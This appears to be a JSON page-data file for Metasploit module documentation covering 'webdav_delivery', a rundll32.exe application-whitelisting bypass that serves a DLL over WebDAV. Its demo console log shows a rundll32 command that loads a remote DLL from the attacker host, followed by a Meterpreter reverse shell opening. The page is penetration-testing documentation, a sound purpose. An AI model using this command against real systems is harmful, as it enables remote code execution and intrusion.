{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/misc/webdav_delivery","result":{"data":{"moduleMetadataJson":{"id":"9526a608-1dab-5fae-8898-25247c2c124a","name":"Serve DLL via webdav server","fullname":"exploit/windows/misc/webdav_delivery","description":"This module simplifies the rundll32.exe Application Whitelisting Bypass technique.\n        The module creates a webdav server that hosts a dll file. When the user types the provided rundll32\n        command on a system, rundll32 will load the dll remotly and execute the provided export function.\n        The export function needs to be valid, but the default meterpreter function can be anything.\n        The process does write the dll to C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp\\TfsStore\\Tfs_DAV\n        but does not load the dll from that location. This file should be removed after execution.\n        The extension can be anything you'd like, but you don't have to use one. Two files will be\n        written to disk. One named the requested name and one with a dll extension attached.","rank":0,"fields":{"detailsSlug":"/modules/details/exploit/windows/misc/webdav_delivery","documentationSlug":"/modules/documentation/exploit/windows/misc/webdav_delivery","referencesSlug":"/modules/references/exploit/windows/misc/webdav_delivery"},"documentation":{"html":"<h1 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h1>\n<p>This module simplifies the rundll32.exe Application Whitelisting Bypass technique</p>\n<p>The module creates a webdav server that hosts a dll file. When the user types the provided\nrundll32 command on a system, rundll32 will load the dll remotly and execute the provided\nexport function.</p>\n<p>The export function needs to be valid, but the default meterpreter function can be anything.\nThe process does write the dll to <code class=\"language-text\">C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp\\TfsStore\\Tfs_DAV</code>\nbut does not load the dll from that location. This file should be removed after execution.</p>\n<p>The extension can be anything you'd like, but you don't have to use one. Two files will be\nwritten to disk. One named the requested name and one with a dll extension attached.</p>\n<p>Please note that there is a slight delay for the target to start making WebDAV requests,\nand then getting a session back.</p>\n<h1 id=\"demo\" style=\"position:relative;\"><a href=\"#demo\" aria-label=\"demo permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Demo</h1>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(windows/misc/webdav_delivery) &gt; run\n[*] Exploit running as background job 3.\n\n[*] Started reverse TCP handler on 172.16.249.1:4444 \nmsf5 exploit(windows/misc/webdav_delivery) &gt; [*] Using URL: http://172.16.249.1:8080/\n[*] Server started.\n[*] Run the following command on the target machine:\nrundll32.exe \\\\172.16.249.1@8080\\ANYTHING,Init\n[*] 172.16.249.130   webdav_delivery - GET /ANYTHING\n[*] Sending stage (180291 bytes) to 172.16.249.130\n[*] Meterpreter session 4 opened (172.16.249.1:4444 -&gt; 172.16.249.130:49219) at 2018-12-12 13:25:06 -0600\n\nmsf5 exploit(windows/misc/webdav_delivery) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information  Connection\n  --  ----  ----                     -----------  ----------\n  4         meterpreter x86/windows               172.16.249.1:4444 -&gt; 172.16.249.130:49219 (172.16.249.130)\n\nmsf5 exploit(windows/misc/webdav_delivery) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"9526a608-1dab-5fae-8898-25247c2c124a"}}}